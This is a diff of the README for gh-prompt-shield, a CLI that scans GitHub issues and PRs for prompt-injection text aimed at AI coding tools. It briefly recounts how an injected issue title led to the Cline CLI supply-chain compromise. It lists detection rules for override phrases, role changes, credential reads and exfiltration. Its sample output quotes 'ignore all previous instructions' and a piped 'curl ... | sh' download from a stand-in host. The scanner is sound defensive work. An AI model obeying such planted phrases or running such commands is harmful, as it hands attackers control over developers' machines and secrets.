@@ -1,30 +1,18 @@
-# 🛡️ gh-prompt-shield
+# gh-prompt-shield 🛡️
 
 > **Built by [The Foundry](https://github.com/solstice035/the-foundry)**, an autonomous build pipeline I run. A Haiku scout finds a developer pain point, a Sonnet agent writes the spec, and aider driving Sonnet builds it overnight.
 >
 > This repo was produced end to end by that pipeline. I commissioned the system, approved each phase of it and reviewed what it shipped.
 
-**Scan GitHub issues & PRs for prompt injection patterns targeting AI coding tools.**
+A CLI that reads the issues and pull requests on a GitHub repo and flags text written to hijack an AI coding tool that reads them. It matches 19 patterns, rates each finding, and exits non-zero when it finds something, so it can sit in CI.
 
-After a [malicious GitHub issue title compromised 4,000+ developer machines](https://www.theregister.com/2025/03/05/github_issue_title_injection/) via Cline's auto-approval mode, it's clear we need a defense layer. `gh-prompt-shield` catches prompt injection attempts in repository content **before** AI coding assistants (Cline, Copilot, Cursor) process them.
+The Foundry picked this up in March 2026, a few weeks after the Cline CLI compromise. An injection planted in a GitHub issue title reached Cline's own AI triage workflow; chained with an Actions cache-poisoning weakness it gave up an npm publish token, and the resulting Cline CLI 2.3.0 shipped a post-install hook that installed OpenClaw on about 4,000 machines before it was pulled. Snyk called the technique Clinejection. See [The Register](https://www.theregister.com/2026/02/20/openclaw_snuck_into_cline_package/) and [SafeDep's write-up](https://safedep.io/cline-cli-compromised/). A scanner like this one would not have stopped that attack on its own, since the damage ran through the workflow's own permissions, but the injected text itself is the kind this tool matches.
 
-## 🎯 What It Does
+Built on 6 March 2026. 43 tests.
 
-- Scans GitHub issue/PR **titles and bodies** for known injection patterns
-- Detects **18+ attack techniques**: instruction overrides, hidden commands, unicode obfuscation, base64 payloads, tool-specific exploits
-- **Severity-rated findings** (critical/high/medium/low) with explanations
-- **Tool-specific profiles** — filter for Cline, Copilot, or Cursor patterns
-- **JSON output** for CI/CD integration
-- **Local file scanning** for pre-commit checks
-- **GitHub Action template** included
+## Installation
 
-## 📦 Installation
-
-```bash
-pip install gh-prompt-shield
-```
-
-Or install from source:
+Not published to PyPI. Install from source:
 
 ```bash
 git clone https://github.com/solstice035/gh-prompt-shield
@@ -32,227 +20,92 @@ cd gh-prompt-shield
 pip install -e ".[dev]"
 ```
 
-## 🚀 Quick Start
-
-### Scan a GitHub repository
+## Using it
 
 ```bash
-# Scan all open issues and PRs
+# scan a repository's open issues and PRs
 gh-prompt-shield scan octocat/hello-world
 
-# Scan with Cline-specific patterns only
+# narrow to the patterns that matter for one tool
 gh-prompt-shield scan myorg/myrepo --profile cline
 
-# JSON output for CI integration
+# machine-readable, for CI
 gh-prompt-shield scan myorg/myrepo --json
 
-# Verbose output with full finding details
-gh-prompt-shield scan myorg/myrepo -v
-
-# Include comment scanning (slower, more API calls)
+# include comments (slower, more API calls), or closed items
 gh-prompt-shield scan myorg/myrepo --comments
-
-# Scan closed issues too
 gh-prompt-shield scan myorg/myrepo --state all
-```
 
-### Scan a local file
-
-```bash
+# a local file, before you commit it
 gh-prompt-shield scan-file issue-template.md
-gh-prompt-shield scan-file suspicious-pr.txt --profile cline --json
-```
 
-### List detection patterns
-
-```bash
+# what it looks for
 gh-prompt-shield list-patterns
-gh-prompt-shield list-patterns --profile cursor
-gh-prompt-shield list-patterns --json
 ```
 
-## 🔍 Detection Patterns
+On a file containing an override and a piped download:
 
-gh-prompt-shield detects **18+ injection patterns** across 4 severity levels:
+```
+⚠️  2 finding(s) in issue.md
+  CRITICAL System prompt override: ignore all previous instructions
+  HIGH Curl/wget payload download: curl http://x.example/p.sh | sh
+```
 
-### 🔴 Critical
+Exit codes are 0 for clean, 1 for findings and 2 for an error, so `scan ... || handle` works in a pipeline.
 
-| ID | Pattern | Description |
-|----|---------|-------------|
-| INJ-001 | System prompt override | "Ignore previous instructions" and variants |
-| INJ-002 | Role reassignment | "You are now...", "Act as..." directives |
-| INJ-003 | Hidden instruction block | HTML/markdown comments hiding AI instructions |
-
-### 🟠 High
-
-| ID | Pattern | Description |
-|----|---------|-------------|
-| INJ-004 | Shell command injection | Direct shell/terminal execution instructions |
-| INJ-005 | Curl/wget payload | Remote payload download and execution |
-| INJ-006 | File system manipulation | Access to .env, SSH keys, credentials |
-| INJ-007 | Data exfiltration | Sending secrets to external endpoints |
-| INJ-008 | Environment variable access | Extracting API keys and tokens |
-| INJ-014 | Cline tool invocation | Direct `<execute_command>` XML tags |
-
-### 🟡 Medium
-
-| ID | Pattern | Description |
-|----|---------|-------------|
-| INJ-009 | Base64 encoded payload | Obfuscated instructions in base64 |
-| INJ-010 | Unicode obfuscation | Zero-width characters hiding content |
-| INJ-011 | Hex/octal encoded commands | Encoded command sequences |
-| INJ-012 | Markdown smuggling | Hidden instructions in images/details tags |
-| INJ-013 | Code fence injection | Instructions disguised as code examples |
-| INJ-015 | Copilot directive injection | @workspace/@terminal directive abuse |
-| INJ-016 | Cursor composer directive | .cursorrules/@composer manipulation |
-| INJ-018 | Suspicious URL + execution | Pastebin/gist URLs with execution language |
-
-### 🔵 Low
-
-| ID | Pattern | Description |
-|----|---------|-------------|
-| INJ-017 | Excessive special characters | Unusual density of backticks/control chars |
-
-Plus **INJ-B64** — automatic base64 decoding that detects encoded injection payloads.
-
-## 🎭 Tool Profiles
-
-Filter patterns for the AI tool you're protecting:
+## Authentication
 
 ```bash
-# Only patterns relevant to Cline
-gh-prompt-shield scan myrepo --profile cline
-
-# Only Copilot-specific patterns
-gh-prompt-shield scan myrepo --profile copilot
-
-# Only Cursor-specific patterns
-gh-prompt-shield scan myrepo --profile cursor
+export GITHUB_TOKEN=...
 ```
 
-## 📝 Custom Rules
+Without a token you get GitHub's unauthenticated limit of 60 requests an hour, against 5,000 with one.
 
-Define your own detection rules in YAML:
+## The patterns
+
+Nineteen rules, `INJ-001` to `INJ-018` plus `INJ-B64`, which base64-decodes content and re-runs the checks on what comes out.
+
+| Severity | Covers |
+|:--|:--|
+| Critical | System prompt overrides, role reassignment, instructions hidden in HTML or markdown comments |
+| High | Shell command injection, piped payload downloads, reads of `.env` or SSH keys, exfiltration to an external endpoint, environment variable access, Cline `<execute_command>` tags |
+| Medium | Base64, unicode zero-width and hex or octal obfuscation, markdown smuggling, code-fence injection, Copilot `@workspace` and `@terminal` abuse, Cursor `.cursorrules` and `@composer` manipulation, pastebin URLs alongside execution language |
+| Low | Unusual density of backticks and control characters |
+
+`--profile cline|copilot|cursor` filters to the patterns tagged for that tool. You can add your own in YAML:
 
 ```yaml
-# custom-rules.yaml
 rules:
   - id: CUSTOM-001
     name: Internal tool injection
-    description: Detects attempts to invoke our internal deployment tool
     severity: critical
     regex: "(?i)deploy\\s+to\\s+production"
-    tags:
-      - cline
-      - cursor
+    tags: [cline, cursor]
 ```
 
 ```bash
 gh-prompt-shield scan myrepo --rules custom-rules.yaml
 ```
 
-## 🤖 GitHub Action
+## GitHub Action
 
-Copy `.github/workflows/prompt-shield.yml` from this repo into your project:
+`.github/workflows/prompt-shield.yml` is a template to copy into your own repository. It installs from this git URL rather than from PyPI, and captures the scan's exit code so a findings result doesn't kill the step before it's reported.
 
-```yaml
-name: Prompt Shield Scan
-on:
-  issues:
-    types: [opened, edited]
-  pull_request:
-    types: [opened, edited]
+## Limits
 
-jobs:
-  scan:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - uses: actions/setup-python@v5
-        with:
-          python-version: "3.12"
-      - run: pip install gh-prompt-shield
-      - run: gh-prompt-shield scan ${{ github.repository }} --json
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-```
+- Regex matching, with no model in the loop. It's fast and predictable, and it misses anything phrased in a way the patterns don't cover. Treat a clean result as "none of these 19 patterns", not "no injection".
+- False positives come with the territory: a security advisory or a test fixture quoting an attack reads much like the attack.
+- GitHub only, on demand or in CI. No webhooks, no other forges.
+- It flags. It won't close, edit or label anything.
 
-## 🔧 Authentication
-
-Set a GitHub token for API access (higher rate limits, private repo access):
+## Development
 
 ```bash
-export GITHUB_TOKEN=ghp_your_token_here
-# or
-gh-prompt-shield scan myrepo --token ghp_your_token_here
-```
-
-Without a token, you're limited to 60 API requests/hour (unauthenticated rate limit).
-
-## 📊 Exit Codes
-
-| Code | Meaning |
-|------|---------|
-| 0 | Clean — no injection patterns found |
-| 1 | Findings — injection patterns detected |
-| 2 | Error — scan failed (auth, network, etc.) |
-
-Use exit codes in CI pipelines:
-
-```bash
-gh-prompt-shield scan myrepo --json > results.json || echo "Findings detected!"
-```
-
-## 🏗️ Architecture
-
-```
-src/gh_prompt_shield/
-├── __init__.py          # Package version
-├── cli.py               # Click CLI interface
-├── patterns.py          # Pattern library & detection engine
-├── scanner.py           # GitHub API scanning orchestrator
-├── github_client.py     # httpx-based GitHub API client
-├── custom_rules.py      # YAML custom rule loader
-├── output.py            # Rich terminal & JSON formatters
-└── profiles/            # Tool-specific configurations
-```
-
-## 🧪 Development
-
-```bash
-# Clone and install dev dependencies
-git clone https://github.com/solstice035/gh-prompt-shield
-cd gh-prompt-shield
 pip install -e ".[dev]"
-
-# Run tests
-pytest -v
-
-# Lint
+pytest -v                # 43 tests
 ruff check src/ tests/
 ```
 
-## ⚠️ Limitations
+## Licence
 
-- **Pattern-based detection only** — no ML/AI analysis (deliberate: keeps it fast and predictable)
-- **GitHub only** — no GitLab, Bitbucket, or other platforms
-- **No real-time monitoring** — scan on-demand or via CI, not webhook-driven
-- **No auto-remediation** — flags issues, doesn't close/edit them
-- **Rate limits apply** — unauthenticated: 60 req/hr, authenticated: 5,000 req/hr
-
-## 🔮 Future Ideas
-
-- Webhook server for real-time monitoring
-- ML-based semantic injection detection
-- IDE extensions (VS Code, JetBrains)
-- GitLab / Bitbucket support
-- Auto-labeling of suspicious issues
-- Integration with GitHub Security Advisories
-
-## 📜 License
-
-MIT
-
----
-
-*Built by [The Foundry](https://github.com/solstice035/the-foundry) 🏭 — Nightly builds from trending developer pain points.*
+MIT. See [LICENSE](LICENSE).
